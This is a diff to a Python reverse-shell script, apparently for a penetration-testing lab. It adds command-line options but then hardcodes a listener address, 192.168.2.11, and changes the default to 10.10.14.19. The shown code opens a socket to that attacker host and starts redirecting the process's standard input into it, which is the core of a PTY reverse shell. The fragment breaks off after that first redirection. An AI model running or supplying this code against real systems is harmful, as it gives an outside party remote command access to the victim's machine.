@@ -13,11 +13,19 @@ Or use the included tcp_pty_shell_handler.py
 import os
 import pty
 import socket
+import argparse
 
-lhost = "127.0.0.1" # XXX: CHANGEME
+lhost = "10.10.14.19" # XXX: CHANGEME
 lport = 31337 # XXX: CHANGEME
 
 def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-lh", "--lhost", dest="lhost", help="ip for lhost")
+    parser.add_argument("-lp", "--lport", dest="lport", help="port for lport")
+    args = parser.parse_args()
+    #lhost = str(args.lhost)
+    lhost = "192.168.2.11"
+    lport = int(args.lport)
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((lhost, lport))
     os.dup2(s.fileno(),0)
